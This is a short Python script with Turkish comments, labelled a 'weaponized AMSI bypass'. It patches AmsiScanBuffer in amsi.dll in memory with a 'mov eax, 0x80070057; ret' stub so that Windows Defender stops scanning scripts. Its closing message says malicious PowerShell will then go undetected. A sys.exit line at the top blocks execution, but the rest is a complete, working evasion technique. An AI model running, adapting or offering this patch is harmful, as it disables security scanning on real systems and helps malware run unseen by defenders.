import ctypes
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Bu kod Windows Defender AMSI korumasını devre dışı bırakır.")

print("--- WEAPONIZED AMSI BYPASS ---")

def patch_amsi():
    print("[*] amsi.dll yükleniyor...")
    
    # 1. ADRES BULMA
    # AmsiScanBuffer fonksiyonunun hafızadaki yerini bul
    # Bu fonksiyon tüm scriptleri tarayan bekçidir.
    
    h_amsi = ctypes.windll.kernel32.LoadLibraryA(b"amsi.dll")
    addr = ctypes.windll.kernel32.GetProcAddress(h_amsi, b"AmsiScanBuffer")
    
    print(f"[*] AmsiScanBuffer Adresi: {hex(addr)}")
    
    # 2. MEMORY PATCH (Weaponized Part)
    # Simülasyon: print("Patchlendi")
    # Gerçek: Fonksiyonun başına "Hata ver ve çık" komutu yaz.
    
    # x64 Patch: b8 57 00 07 80 c3 (mov eax, 0x80070057; ret)
    # Bu kod "Tarama başarısız oldu" diyip fonksiyondan çıkar.
    patch = b"\xb8\x57\x00\x07\x80\xc3"
    
    old_protect = ctypes.c_ulong()
    ctypes.windll.kernel32.VirtualProtect(addr, len(patch), 0x40, ctypes.byref(old_protect))
    
    # Hafızayı değiştir
    ctypes.memmove(addr, patch, len(patch))
    
    ctypes.windll.kernel32.VirtualProtect(addr, len(patch), old_protect, ctypes.byref(old_protect))
    
    print("💀 AMSI KÖR EDİLDİ.")
    print("Artık Powershell'de zararlı kod çalıştırsanız bile Defender görmeyecek.")

if __name__ == "__main__":
    patch_amsi()